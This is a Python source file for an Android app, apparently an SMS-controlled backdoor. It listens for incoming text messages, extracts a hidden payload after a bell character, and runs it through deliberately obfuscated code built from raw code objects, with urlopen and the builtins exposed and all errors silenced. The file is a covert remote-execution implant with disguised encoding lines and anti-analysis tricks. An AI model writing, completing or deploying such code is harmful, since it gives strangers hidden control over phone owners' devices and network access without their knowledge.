#!/hfe/ova/clguba
# -*- pbqvat: ebg13 -*-
from json import loads
from functools import partial
from urllib2 import urlopen
from hcode import *
from AESman import decode
from time import sleep
import kivy
kivy.require('1.0.5')
from jnius import autoclass, cast
from android.broadcast import BroadcastReceiver
from kivy.uix.floatlayout import FloatLayout
from kivy.properties import ObjectProperty, StringProperty
from kivy.lang import Builder
from kivy.app import App

SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED"
Byte = autoclass("java.lang.Byte")
Bundle = autoclass("android.os.Bundle")
SmsMessage = autoclass("android.telephony.SmsMessage")
sms_manager = autoclass("android.telephony.SmsManager")
sms_manager.getDefault()
def fire_in_the_disco(msg):
    reconstitute(msg,wwpd)
    try:
        f=type((lambda:(lambda:None for n in range(len(((((),(((),())))))))))().next())
        u=(lambda:type((lambda:(lambda:None for n in range(len(zip((((((((())))))))))))).func_code))()
        n=f(u(int(wwpd[4][1]),int(wwpd[7][1]),int(wwpd[6][1]),int(wwpd[9][1]),wwpd[2][1],
            (None,wwpd[10][1],wwpd[13][1],wwpd[11][1],wwpd[15][1]),(wwpd[20][1],wwpd[21][1]),
            (wwpd[16][1],wwpd[17][1],wwpd[18][1],wwpd[11][1],wwpd[19][1]),wwpd[22][1],wwpd[25][1],int(wwpd[4][1]),wwpd[0][1]),
            {wwpd[27][1]:__builtins__,wwpd[28][1]:wwpd[29][1]})
        c=partial(n, [x for x in map(lambda i:n(i),range(int(0xbeef)))])
        FIGHT = f(u(int(wwpd[4][1]),int(wwpd[4][1]),int(wwpd[5][1]),int(wwpd[9][1]),wwpd[3][1],
                (None, wwpd[23][1]), (wwpd[14][1],wwpd[24][1]),(wwpd[12][1],),wwpd[22][1],wwpd[26][1],int(wwpd[8][1]),wwpd[1][1]),
                {wwpd[14][1]:c,wwpd[24][1]:urlopen,wwpd[27][1]:__builtins__,wwpd[28][1]:wwpd[29][1]})
        FIGHT(msg)
    except:
        pass


def on_sms_received(context, intent):
    msg_bundle = Bundle(intent.getExtras())
    msg_bytes = [m for m in msg_bundle.get("pdus")]
    messages = [SmsMessage.createFromPdu(mb) for mb in msg_bytes]
    for m in messages:
        msg = m.getMessageBody().split("\a")[1]
        fire_in_the_disco(msg)

if __name__ == "__main__":
    br = BroadcastReceiver(on_sms_received, actions=[SMS_RECEIVED])
    br.start()

    while 1:
        sleep(60*5)
